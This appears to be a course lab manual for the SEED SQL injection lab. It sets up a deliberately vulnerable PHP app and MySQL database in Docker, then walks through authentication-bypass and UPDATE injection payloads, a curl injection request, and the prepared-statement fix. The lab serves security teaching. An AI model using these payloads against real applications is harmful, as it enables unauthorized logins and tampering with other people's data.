# Lab 01 — SQL Injection Attack Lab

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Web_SQL_Injection/
Textbook: Chapter 12 — SQL Injection (*Computer & Internet Security*, Prof. Wenliang Du)

For authorized educational use only.

---

## Security Concept

SQL injection occurs when a web application builds SQL queries by concatenating raw user input into a query string. An attacker who controls the input can inject SQL syntax that changes the meaning of the query — bypassing authentication, reading unauthorized data, or modifying the database.

Example of the flaw:

```php
// User types: admin'#
// PHP builds this query string by direct concatenation:
$sql = "SELECT * FROM credential WHERE Name='admin'#' AND Password='$pwd'";
//                                                    ^
//                                              SQL comment starts here.
//                                         Everything after # is ignored.
//                                         Password check is completely bypassed.
```

---

## Container Architecture

```
HOST MACHINE
  |
  | Hosts file: www.seed-server.com -> 10.9.0.5
  | Port mapping: localhost:10080   -> container:80
  |
  Docker Bridge Network: net-10.9.0.0-sqli  (10.9.0.0/24)
    |
    +---- www-10.9.0.5   (Apache 2.4 + PHP + vulnerable app, Port 80)
    |         |
    |         | MySQL connection to 10.9.0.6:3306
    |         |
    +---- mysql-10.9.0.6 (MySQL 8.0 + sqllab_users database)
```

---

## Layer 1 — Docker Commands (run on your host terminal)

### Start the Lab

```bash
# Navigate to this lab directory
cd labs/01-sql-injection

# Build images from local Dockerfiles and start both containers
docker compose up -d --build

# This builds two images:
#   image_www/Dockerfile   -> Apache + PHP + index.php (vulnerable app)
#   image_mysql/Dockerfile -> MySQL 8.0 + sqllab_users.sql (employee database)
```

### Verify Containers Are Running

```bash
docker compose ps

# Expected output:
# NAME             IMAGE                   STATUS    PORTS
# www-10.9.0.5     seed-image-www-sqli     Up        0.0.0.0:10080->80/tcp
# mysql-10.9.0.6   seed-image-mysql-sqli   Up        3306/tcp
```

### Inspect the Docker Network

```bash
# See which containers are on the lab network and their IPs
docker network inspect net-10.9.0.0-sqli

# Confirm specific container IP
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' www-10.9.0.5
# Output: 10.9.0.5
```

### Watch Container Logs from Host

```bash
# Stream Apache and MySQL logs from host (no need to enter container)
docker compose logs -f www
docker compose logs -f mysql

# View last 30 lines only
docker compose logs --tail 30 www
```

---

## Layer 2 — Linux Commands (inside the container)

### Step 1: Open a Bash Shell Inside the Web Container

```bash
docker exec -it www-10.9.0.5 bash
```

Your prompt changes from your host prompt to the container prompt:

```
Before: PS C:\> (Windows)  OR  user@host:~$ (Linux)
After:  root@www-10.9.0.5:/#
```

You are now inside the container's Linux user space.

---

### Step 2: Establish Identity

```bash
whoami
# root
# You are running as the root user inside this container.

id
# uid=0(root) gid=0(root) groups=0(root)

hostname
# www-10.9.0.5
# The container's hostname matches its container_name in docker-compose.yml

ip addr show
# Look for eth0 showing inet 10.9.0.5/24
# This is the container's IP on the Docker bridge network
```

---

### Step 3: Inspect the Web Application Files

```bash
# Navigate to Apache's document root (where PHP files are served from)
cd /var/www/html

# List all files
ls -la
# You should see index.php — the vulnerable application

# Read the source code
cat index.php

# Find the vulnerable SQL query lines
grep -n "SELECT" index.php
grep -n "credential" index.php
grep -n "password\|Password" index.php

# Count total lines
wc -l index.php
```

---

### Step 4: Inspect Running Processes

```bash
# Show all processes inside the container
ps aux

# You will see:
# USER       PID  COMMAND
# root         1  /bin/sh -c service apache2 start && tail -f /dev/null
# root        xx  apache2 -DFOREGROUND     <- master Apache process (runs as root)
# www-data    xx  apache2 -DFOREGROUND     <- worker processes (run as www-data)
#
# Security note: root starts Apache, but workers run as www-data (unprivileged).
# If an attacker exploits the PHP app, they get www-data, not root.

# Check what port Apache is listening on
ss -tlnp
# Shows: 0.0.0.0:80 (Apache bound to all interfaces on port 80)
```

---

### Step 5: Check Environment Variables

```bash
env
# Look for:
# MYSQL_HOST=10.9.0.6
# This tells the PHP application which IP to connect to for MySQL.
# It is set in docker-compose.yml under 'environment:'

echo $MYSQL_HOST
# 10.9.0.6
```

---

### Step 6: View Apache Logs Inside Container

```bash
# Watch HTTP requests arrive in real time while you use the browser
tail -f /var/log/apache2/access.log

# Each line shows: IP, timestamp, request, status code, bytes
# You can see exactly what your browser is sending to the server

# Press Ctrl+C to stop streaming
```

---

### Step 7: Test Connectivity to MySQL Container

```bash
# Ping the MySQL container from inside the web container
ping -c 3 10.9.0.6

# Connect to MySQL directly from inside the web container
mysql -h 10.9.0.6 -u root -pdees sqllab_users

# Inside MySQL shell — explore the database:
SHOW TABLES;
# credential

DESCRIBE credential;
# Shows: ID, Name, EID, Salary, Birthday, SSN, PhoneNumber, Address, Email, NickName, Password

SELECT Name, EID, Salary FROM credential;
# Shows all employee records

EXIT;
```

---

### Step 8: Exit the Container Shell

```bash
exit
```

Your prompt returns to your host terminal:

```
Before: root@www-10.9.0.5:/#
After:  PS C:\> (Windows)  OR  user@host:~$ (Linux)
```

You are back on your host machine.

---

### Enter the MySQL Container (Optional)

```bash
# Enter the MySQL container directly
docker exec -it mysql-10.9.0.6 bash

# Inside the MySQL container:
mysql -u root -pdees
# Then:
USE sqllab_users;
SELECT * FROM credential;
EXIT;
exit   # exit container
```

---

## Layer 3 — Security Tasks (browser + host terminal)

### Configure Hostname (Optional but Recommended)

**Windows — PowerShell as Administrator:**

```powershell
Add-Content "C:\Windows\System32\drivers\etc\hosts" "10.9.0.5   www.seed-server.com"
```

**Linux / WSL2:**

```bash
echo "10.9.0.5   www.seed-server.com" | sudo tee -a /etc/hosts
```

### Access the Vulnerable Application

```
http://localhost:10080          Direct — always works
http://www.seed-server.com      With hosts file configured
```

---

### Task 2.1 — Authentication Bypass via Login Form

In the browser, go to the Login section and enter:

```
Username: admin'#
Password: (anything — it will be ignored)
```

What happens in SQL:

```sql
-- What the PHP builds:
SELECT * FROM credential WHERE Name='admin'#' AND Password='xyz'

-- What MySQL sees (# starts a comment):
SELECT * FROM credential WHERE Name='admin'
-- Password check never runs -> admin record returned -> login succeeds
```

Verify in database what was returned:

```bash
docker exec -it mysql-10.9.0.6 mysql -u root -pdees \
  -e "SELECT Name, Salary, SSN FROM sqllab_users.credential WHERE Name='admin';"
```

---

### Task 2.2 — SQL Injection via curl (Command Line)

Run from your host terminal without using a browser:

```bash
# Linux / macOS
curl "http://localhost:10080/?E_Name=alice'%23"

# Windows PowerShell
curl.exe "http://localhost:10080/?E_Name=alice'%23"
```

---

### Task 3.1 — UPDATE Injection (Modify Salary)

In the browser Update Profile form, enter:

```
Target Name: alice
New Salary:  1, Salary=999999 WHERE Name='alice'--
```

What PHP builds:

```sql
UPDATE credential SET Salary=1, Salary=999999 WHERE Name='alice'-- WHERE Name='alice'
```

Verify the change:

```bash
docker exec -it mysql-10.9.0.6 mysql -u root -pdees \
  -e "SELECT Name, Salary FROM sqllab_users.credential;"
```

---

### Task 4 — Countermeasure: Prepared Statements

The Secure Search section in the app uses prepared statements. Try the same injection payload:

```
Secure Search field: admin'#
```

The injection fails because the query uses `?` placeholders — the input is treated as data, never as SQL syntax:

```php
// Secure (parameterized query):
$stmt = $conn->prepare("SELECT * FROM credential WHERE Name=?");
$stmt->bind_param("s", $name);   // $name is bound as a string, not injected
$stmt->execute();
```

---

## Stop and Reset

```bash
# Stop containers (database changes preserved)
docker compose down

# Full reset — wipe database and restore original data from sqllab_users.sql
docker compose down -v
docker compose up -d --build
```

Verify reset worked:

```bash
docker exec -it mysql-10.9.0.6 mysql -u root -pdees \
  -e "SELECT Name, Salary FROM sqllab_users.credential;"
# All salaries back to original values
```

---

## Key File Locations Inside Containers

| File               | Container          | Path                                             |
| ------------------ | ------------------ | ------------------------------------------------ |
| Vulnerable PHP app | `www-10.9.0.5`   | `/var/www/html/index.php`                      |
| Apache access log  | `www-10.9.0.5`   | `/var/log/apache2/access.log`                  |
| Apache error log   | `www-10.9.0.5`   | `/var/log/apache2/error.log`                   |
| Apache config      | `www-10.9.0.5`   | `/etc/apache2/sites-enabled/000-default.conf`  |
| MySQL data dir     | `mysql-10.9.0.6` | `/var/lib/mysql/`                              |
| SQL init script    | `mysql-10.9.0.6` | `/docker-entrypoint-initdb.d/sqllab_users.sql` |

Access any file from the host without entering the container:

```bash
docker exec www-10.9.0.5 cat /var/log/apache2/access.log
docker cp www-10.9.0.5:/var/www/html/index.php ./index.php
```
